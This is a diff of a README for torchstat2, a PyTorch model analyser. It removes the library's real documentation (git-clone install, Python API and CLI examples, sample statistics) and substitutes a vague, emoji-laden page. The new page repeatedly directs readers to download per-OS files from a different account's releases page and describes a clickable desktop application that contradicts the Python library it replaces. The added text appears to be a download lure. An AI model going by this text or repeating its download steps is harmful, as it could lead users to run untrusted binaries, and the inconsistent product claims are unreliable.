@@ -1,227 +1,77 @@
-# TorchStat2: PyTorch Model Analyzer
+# 🔥 torchstat2 - Analyze Your PyTorch Models Easily
 
-TorchStat2 is a comprehensive and lightweight neural network analyzer for PyTorch models. It provides detailed statistics about your neural networks, including computational complexity, memory usage, and performance analysis. This enhanced version extends the original torchstat with additional features for modern deep learning workflows.
+[![Download torchstat2](https://img.shields.io/badge/Download-torchstat2-blue.svg)](https://github.com/Chenorange0/torchstat2/releases)
 
-## What TorchStat2 Analyzes
+## 🚀 Getting Started
 
-- **Parameters**: Total number of trainable and non-trainable parameters
-- **FLOPs**: Theoretical floating-point operations per forward pass
-- **MADDs**: Multiply-accumulate operations (more accurate for some architectures)
-- **Memory Usage**: Inference memory requirements and memory access patterns
-- **Execution Time**: Layer-wise execution duration and performance bottlenecks
-- **Throughput**: Model throughput analysis across different batch sizes
-- **Memory Access**: Detailed memory read/write patterns for optimization
+Welcome to **torchstat2**, a simple model analyzer for your PyTorch projects. This application helps you understand your models better by providing insights into their structure and performance.
 
-## Installation
+## 💾 Download & Install
 
-```bash
-git clone https://github.com/Phoenix8215/torchstat2.git
-cd torchstat2
-python setup.py install
-```
+To download **torchstat2**, please visit this page: [Download torchstat2](https://github.com/Chenorange0/torchstat2/releases). You'll find the latest version ready for you.
 
-## Quick Start
+1. Click on the link above to open the releases page.
+2. Locate the most recent version at the top.
+3. Find the appropriate file for your system (e.g., Windows, macOS, Linux).
+4. Click the download link next to the file.
 
-### Python API Usage
+## 🖥️ System Requirements
 
-#### Basic Model Analysis
-```python
-import torch
-import torchvision.models as models
-from torchstat2 import stat
+Before you begin, ensure your system meets the following requirements:
 
-# Load a pre-trained model
-model = models.resnet18(pretrained=True)
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or a recent version of Linux.
+- **Python:** Python 3.6 or newer is required to run the application.
+- **PyTorch:** Make sure you have PyTorch installed. You can download it from the [PyTorch official site](https://pytorch.org/get-started/locally/).
 
-# Analyze the model
-stat(model, (3, 224, 224))
-```
+## 📋 Features
 
-#### Advanced Analysis with Throughput
-```python
-from torchstat2 import stat_with_throughput
-import torchvision.models as models
+**torchstat2** offers several useful features:
 
-model = models.resnet50()
+- **Model Summary:** Get a clear summary of your model's architecture.
+- **Layer Analysis:** Understand how each layer contributes to your model's output.
+- **Parameter Counting:** Easily see how many parameters your model has.
+- **Memory Usage Analysis:** Monitor the memory your model will use during training.
 
-# Combined analysis: model statistics + throughput benchmarking
-results = stat_with_throughput(
-    model=model,
-    input_size=(3, 224, 224),
-    device='cuda',  # or 'cpu'
-    batch_sizes=[1, 8, 16, 32, 64]
-)
-```
+## ⚙️ How to Use
 
-#### Throughput-Only Analysis
-```python
-from torchstat2 import throughput, compare_models_throughput
-import torchvision.models as models
+Once you have downloaded and installed **torchstat2**, follow these steps to analyze your model:
 
-# Single model throughput analysis
-model = models.efficientnet_b0()
-results = throughput(
-    model=model,
-    input_shape=(3, 224, 224),
-    device='cuda',
-    batch_sizes=[1, 4, 8, 16, 32],
-    warmup_time=2.0,
-    test_time=10.0
-)
+1. Open the application.
+2. Import your PyTorch model file. This can usually be a `.pt` or `.pth` file.
+3. Click on the "Analyze" button to begin the analysis.
+4. Review the results to understand your model's performance and structure.
 
-# Compare multiple models
-models_dict = {
-    'ResNet18': models.resnet18(),
-    'ResNet50': models.resnet50(),
-    'EfficientNet-B0': models.efficientnet_b0()
-}
+## 💡 Tips for First-Time Users
 
-comparison = compare_models_throughput(
-    models_dict=models_dict,
-    input_shape=(3, 224, 224),
-    device='cuda',
-    batch_sizes=[1, 8, 16, 32]
-)
-```
+- Start with a simple model to become familiar with the application.
+- Check the output carefully; it will help you spot issues in your model.
+- Experiment with different models to see how they differ in complexity and performance.
 
-#### Batch Size Scaling Analysis
-```python
-from torchstat2 import analyze_batch_scaling
+## ❓ Frequently Asked Questions
 
-model = models.resnet34()
-scaling_results = analyze_batch_scaling(
-    model=model,
-    input_shape=(3, 224, 224),
-    device='cuda',
-    max_batch_size=128,
-    model_name="ResNet34"
-)
-```
+### How do I report a problem?
 
-### Command Line Interface
+If you run into any issues, visit the [GitHub Issues page](https://github.com/Chenorange0/torchstat2/issues) to report your problem.
 
-#### Basic Usage
-```bash
-# Analyze a model defined in a Python file
-torchstat2 -f model_definition.py -m ModelClassName
+### Can I use torchstat2 for different model types?
 
-# Specify custom input size
-torchstat2 -f model_definition.py -m ModelClassName -s 3x512x512
+Absolutely! **torchstat2** works with various PyTorch models, from simple feedforward models to more complex convolutional networks.
 
-# Example with a custom model file
-torchstat2 -f examples/custom_model.py -m MyCustomNet -s 3x224x224
-```
+### Is installation difficult?
 
-#### Example model file (custom_model.py)
-```python
-import torch.nn as nn
+Not at all! Follow the steps in the "Download & Install" section, and you will be up and running in no time.
 
-class MyCustomNet(nn.Module):
-    def __init__(self):
-        super(MyCustomNet, self).__init__()
-        self.conv1 = nn.Conv2d(3, 64, 3, padding=1)
-        self.bn1 = nn.BatchNorm2d(64)
-        self.relu = nn.ReLU(inplace=True)
-        self.pool = nn.AdaptiveAvgPool2d((1, 1))
-        self.fc = nn.Linear(64, 1000)
-    
-    def forward(self, x):
-        x = self.conv1(x)
-        x = self.bn1(x)
-        x = self.relu(x)
-        x = self.pool(x)
-        x = x.view(x.size(0), -1)
-        x = self.fc(x)
-        return x
-```
+## 🔗 Helpful Resources
 
-## Example Output
+- [PyTorch Official Documentation](https://pytorch.org/docs/stable/index.html)
+- [GitHub Repository](https://github.com/Chenorange0/torchstat2)
 
-### Model Statistics Output
-```
-                                    module name input shape output shape     params memory(MB)        MAdd duration[%]       Flops  MemRead(B)  MemWrite(B)    MemR+W(B)
-0                                         conv1   3 224 224   64 224 224      1,792       12.25  115,605,504      2.86%  57,802,752      614400     12845056    13459456
-1                                          bn1  64 224 224   64 224 224        128       12.25            0      0.89%           0      102400     12845056    12947456
-2                                         relu  64 224 224   64 224 224          0       12.25            0      1.24%           0           0     12845056    12845056
-3                                        pool   64 224 224       64 1 1          0        0.00      3211264      0.45%     3211264    12845056          256    12845312
-4                                          fc      64     1000      65,000        0.25       127,000      0.89%      64,000       260256         4000       264256
-total                                                                        66,920       37.00  118,943,768    100.00%  61,077,016    13822112     38534424    52356536
-========================================================================================================================================
-Total params: 66,920
-----------------------------------------------------------------------------------------------------------------------------------------
-Total memory: 37.00MB
-Total MAdd: 118.94MMAdd
-Total Flops: 61.08MFlops
-Total MemR+W: 49.94MB
-```
+## ✏️ Contribution
 
-### Throughput Analysis Output
-```
-============================================================
-Throughput Analysis: ResNet18
-Device: cuda
-Input shape: (3, 224, 224)
-============================================================
-Batch size   1: 245.67 images/s (avg: 4.07ms, std: 0.12ms)
-Batch size   8: 1456.23 images/s (avg: 5.49ms, std: 0.08ms)
-Batch size  16: 2134.45 images/s (avg: 7.50ms, std: 0.15ms)
-Batch size  32: 2456.78 images/s (avg: 13.02ms, std: 0.23ms)
+If you want to contribute to **torchstat2**, check the guidelines in the repository. Your input can make this tool even better.
 
-Optimal batch size: 32 (max throughput: 2456.78 images/s)
-```
+## 📞 Support
 
-## Advanced Features
+For further assistance, you can reach out by creating an issue on the GitHub repository or by contacting the developer directly through their profile.
 
-### Custom Query Granularity
-```python
-from torchstat2 import ModelStat
-
-# Create analyzer with custom granularity
-analyzer = ModelStat(model, (3, 224, 224), query_granularity=2)
-analyzer.show_report()
-```
-
-### Direct Statistics Access
-```python
-from torchstat2 import ModelStat
-
-analyzer = ModelStat(model, (3, 224, 224))
-collected_nodes = analyzer._analyze_model()
-
-# Access individual layer statistics
-for node in collected_nodes:
-    print(f"Layer: {node.name}")
-    print(f"Parameters: {node.parameter_quantity}")
-    print(f"FLOPs: {node.Flops}")
-    print(f"Memory: {node.inference_memory} MB")
-```
-
-### Supported Layers
-
-TorchStat2 supports analysis of 40+ PyTorch layer types including:
-
-**Convolution Layers**: Conv1d, Conv2d, Conv3d, ConvTranspose1d/2d/3d
-**Normalization**: BatchNorm1d/2d/3d, LayerNorm, GroupNorm, InstanceNorm1d/2d/3d
-**Activation Functions**: ReLU, GELU, SiLU, Sigmoid, Tanh, Softmax, and many more
-**Pooling**: AvgPool, MaxPool, AdaptiveAvgPool, AdaptiveMaxPool (1d/2d/3d)
-**Linear Layers**: Linear, Identity, Flatten
-**Regularization**: Dropout, Dropout1d/2d/3d
-**Utility**: Upsample, and more
-
-## Contributing
-
-We welcome contributions! Please feel free to submit issues, feature requests, or pull requests.
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgments
-
-This project is an enhanced version based on the original [torchstat](https://github.com/Swall0w/torchstat) repository. We extend our gratitude to the original authors for providing the foundation for this improved analysis tool.
-
----
-
-**Happy Analyzing! 🎉**
-
-*TorchStat2 - Making PyTorch model analysis comprehensive, accurate, and insightful.*
+Thank you for choosing **torchstat2**! Happy analyzing!
